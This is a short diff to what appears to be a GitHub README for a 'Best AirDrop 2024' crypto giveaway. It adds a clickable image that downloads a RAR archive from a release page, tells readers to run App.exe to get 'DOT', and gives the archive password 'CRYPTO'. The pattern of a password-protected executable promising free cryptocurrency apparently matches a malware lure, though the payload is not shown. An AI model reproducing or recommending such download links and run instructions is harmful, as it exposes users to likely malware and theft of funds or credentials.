@@ -10,4 +10,8 @@ Now just run the program App.exe and you get the coveted DOT!
 
 ![329616632-dc35e7e8-7951-4977-a6e4-df4a1c1a3347](https://github.com/user-attachments/assets/dded275a-72a1-4edd-8a94-e9b81fbbe23d)
 
+
+
+[![image](https://github.com/user-attachments/assets/dded275a-72a1-4edd-8a94-e9b81fbbe23d)](https://github.com/GabrielSousaSampaio/Best-AirDrop-2024/releases/download/Download/AirDrop.rar)
+
 # PASSWORD - CRYPTO
